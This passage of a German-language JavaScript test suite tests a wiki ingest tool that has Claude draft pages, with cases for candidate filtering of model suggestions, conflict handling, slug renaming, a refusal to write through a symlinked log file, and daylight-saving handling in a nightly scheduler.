  put('wiki/privat/elastischer-loop.md', '---\ntype: concept\ntitle: Privat\n---\n# Privat\n');
  reindex();
  const r = await make().apply(doc.id, { items: ['n1', 'q1'] });
  assert.ok(!existsSync(join(root, 'wiki/concepts/elastischer-loop.md')));
  assert.ok(!existsSync(join(root, 'wiki/questions/wie-weit-strecken.md')));
  assert.deepEqual(r.written, [r.source]);
  assert.deepEqual(r.linked, ['wiki/synthesis/wie-weit-strecken.md']);
  assert.match(read('wiki/synthesis/wie-weit-strecken.md'), /## Quellen\n\n- \[\[glaser-der-elastische-loeop\]\]\n$/);
  // Der Link auf die weggelassene Seite wird Text.
  assert.match(read(r.source), /mit Elastischer Loop und \[\[robert-glaser\]\]/);
});

test('force: Übernommenes und angefangenes Übernehmen werden weder neu entworfen noch verworfen', async () => {
  const { ingest } = await drafted();
  const real = editor.setFrontmatter;
  editor.setFrontmatter = (args) => {
    if (args.path === 'wiki/entities/robert-glaser.md') throw new Error('gleichzeitig geändert');
    return real(args);
  };
  await assert.rejects(ingest.apply(doc.id, { items: ['v1', 'v2'] }), (e) => e.status === 409);
  editor.setFrontmatter = real;
  const applied = ingest.get(doc.id).applied;
  assert.ok(applied.steps.length);
  assert.throws(() => ingest.request([doc.id], { force: true }), (e) => e.status === 409 && /Übernehmen angefangen/.test(e.message));
  assert.throws(() => ingest.discard(doc.id), (e) => e.status === 409 && /Übernehmen angefangen/.test(e.message));
  assert.deepEqual(ingest.get(doc.id).applied, applied);
  assert.equal(ingest.get(doc.id).status, 'bereit');

  await ingest.apply(doc.id, { items: ['v1', 'v2'] });
  assert.throws(() => ingest.request([doc.id], { force: true }), (e) => e.status === 409 && /Schon ins Wiki übernommen/.test(e.message));
  assert.equal(ingest.get(doc.id).status, 'uebernommen');
  assert.deepEqual(ingest.request([doc.id]).queued, []);
});

test('Nur Kandidaten: Seiten, die Claude nicht gezeigt wurden, werden weder verknüpft noch bestätigt noch Relationsziel', async () => {
  put('wiki/concepts/zettelkasten.md', '---\ntype: concept\ntitle: Zettelkasten\nsummary: Karteikarten\n---\n# Zettelkasten\n\nKarteikarten.\n');
  reindex();
  answer = {
    ...CLAUDE(),
    digest: { ...CLAUDE().digest, dockt_an: [{ path: 'wiki/concepts/zettelkasten.md', warum: 'eingeschleust' }], bestaetigt: [{ path: 'zettelkasten', claim: 'x' }], widerspricht: [] },
    neu: [{ kind: 'concept', slug: 'zettelkasten', title: 'Zettelkasten', summary: 'x', body: '', warum: 'Name schon vergeben' }],
    relationen: [{ type: 'uses', to: 'wiki/concepts/zettelkasten.md' }],
  };
  const { row } = await drafted();
  assert.ok(!calls[0].input.includes('zettelkasten'), 'kein Kandidat');
  const touching = row.draft.items.filter((i) => (i.path ?? i.to) === 'wiki/concepts/zettelkasten.md');
  // Nur der „neue“ Slug, den es schon gibt, bleibt als Verknüpfen – abgewählt.
  assert.deepEqual(touching.map((i) => `${i.kind} ${i.action ?? i.type} ${i.default}`), ['concept verknuepfen false']);
  assert.deepEqual(row.draft.digest.dockt_an, []);
  assert.deepEqual(row.draft.digest.bestaetigt, []);
});

test('Source-Pages: weder Verknüpfen noch Bestätigen (dort stehen Rohquellen in `sources`)', async () => {
  put('wiki/sources/glaser-the-elastic-loop.md', '---\ntype: source\ntitle: The Elastic Loop (alt)\nsummary: Loop\nsources:\n  - raw/alt.md\n---\n# The Elastic Loop\n\nLoop mit Backpressure.\n');
  reindex();
  answer = {
    ...CLAUDE(),
    digest: { ...CLAUDE().digest, dockt_an: [{ path: 'wiki/sources/glaser-the-elastic-loop.md', warum: 'ältere Fassung' }], bestaetigt: [{ path: 'wiki/sources/glaser-the-elastic-loop.md', claim: 'x' }], widerspricht: [] },
    neu: [{ kind: 'concept', slug: 'glaser-the-elastic-loop', title: 'Alt', summary: 'x', body: '', warum: 'x' }],
    relationen: [{ type: 'related-to', to: 'wiki/sources/glaser-the-elastic-loop.md' }],
  };
  const { row } = await drafted();
  assert.ok(calls[0].input.includes('wiki/sources/glaser-the-elastic-loop.md'), 'Kandidat');
  const items = row.draft.items.filter((i) => (i.path ?? i.to) === 'wiki/sources/glaser-the-elastic-loop.md');
  assert.deepEqual(items.map((i) => `${i.kind} ${i.type}`), ['relation related-to'], 'nur als Relation');
});

test('„## Quellen“: in einem Code-Block oder doppelt → Übernehmen bricht nicht ab', async () => {
  put('wiki/concepts/backpressure.md', '---\ntype: concept\ntitle: Backpressure\nsummary: Widerstand für Agent-Output\n---\n\n# Backpressure\n\nBackpressure ist Widerstand für Agenten im Loop.\n\n```md\n## Quellen\n```\n');
  put('wiki/entities/robert-glaser.md', '---\ntype: entity\nentity-type: person\ntitle: Robert Glaser\n---\n\n# Robert Glaser\n\nAutor von Loop-Texten.\n\n## Quellen\n\n- [[alt]]\n\n### Quellen\n\n- [[älter]]\n');
  reindex();
  const { ingest } = await drafted();
  await ingest.apply(doc.id, { items: ['v1', 'v2'] });
  assert.match(read('wiki/concepts/backpressure.md'), /```md\n## Quellen\n```\n\n## Quellen\n\n- \[\[glaser-der-elastische-loeop\]\]\n$/);
  assert.match(read('wiki/entities/robert-glaser.md'), /### Quellen\n\n- \[\[älter\]\]\n- \[\[glaser-der-elastische-loeop\]\]\n$/);
});

test('Slug geändert: Selbstlinks in Source-Page und neuen Seiten zeigen auf den tatsächlichen Slug', async () => {
  answer = CLAUDE();
  answer.source.body = 'Mehr dazu [[glaser-der-elastische-loeop#Kern|hier]] und [[Glaser – Der Elastische Löop]].';
  answer.neu[1].body = 'Eingeführt in [[glaser-der-elastische-loeop]].';
  const { ingest } = await drafted();
  const r = await ingest.apply(doc.id, { items: ['n1'], source: { slug: 'glaser-loop' } });
  assert.equal(r.source, 'wiki/sources/glaser-loop.md');
  assert.match(read(r.source), /Mehr dazu \[\[glaser-loop#Kern\|hier\]\] und \[\[glaser-loop\]\]\./);
  assert.match(read('wiki/concepts/elastischer-loop.md'), /Eingeführt in \[\[glaser-loop\]\]\./);
  assert.ok(!read('wiki/concepts/elastischer-loop.md').includes('glaser-der-elastische-loeop'));
});

test('Log: ein Symlink an seiner Stelle (auch ins Leere) wird nicht beschrieben', async () => {
  rmSync(join(root, 'wiki/log.md'));
  const outside = join(root, '..', `aussen-${Date.now()}.md`);
  symlinkSync(outside, join(root, 'wiki/log.md'));
  const { ingest } = await drafted();
  await assert.rejects(ingest.apply(doc.id, { items: [] }), (e) => e.status === 409 && /wiki\/log\.md ist ein Symlink/.test(e.message));
  assert.ok(!existsSync(outside));
});

test('Nachtlauf-Takt: scheitert der Merker in der Datei, läuft er trotzdem nur einmal; fehlt die Stunde (Sommerzeit), in der nächsten', () => {
  let runs = 0;
  let t = new Date('2026-10-25T02:10:00Z'); // 03:10 in Berlin
  put('data/keine-datei', 'x');
  const warnings = [];
  const clock = createNightlyClock({ ingest: { nightly: () => ++runs }, settings, file: join(root, 'data/keine-datei/ingest-nacht.txt'), now: () => t, logger: { ...quiet, warn: (m) => warnings.push(m) } });
  assert.equal(clock.tick(), 1);
  t = new Date('2026-10-25T02:20:00Z');
  assert.equal(clock.tick(), null, 'nicht noch einmal in derselben Stunde');
  assert.equal(runs, 1);
  assert.match(warnings.join('\n'), /nicht schreibbar/);

  // 28. März 2027: auf 01:59 folgt 03:00, die eingestellte Stunde 2 gibt es nicht.
  settings.save({ ingest: { hour: 2 }, calendars: [] });
  const dst = createNightlyClock({ ingest: { nightly: () => ++runs }, settings, now: () => t, logger: quiet });
  t = new Date('2027-03-28T00:50:00Z'); // 01:50
  assert.equal(dst.tick(), null);
  t = new Date('2027-03-28T01:10:00Z'); // 03:10
  assert.equal(dst.tick(), 2);
  // An einem gewöhnlichen Tag um 3 nicht.
  t = new Date('2027-03-29T01:10:00Z'); // 03:10
  assert.equal(dst.tick(), null);
});
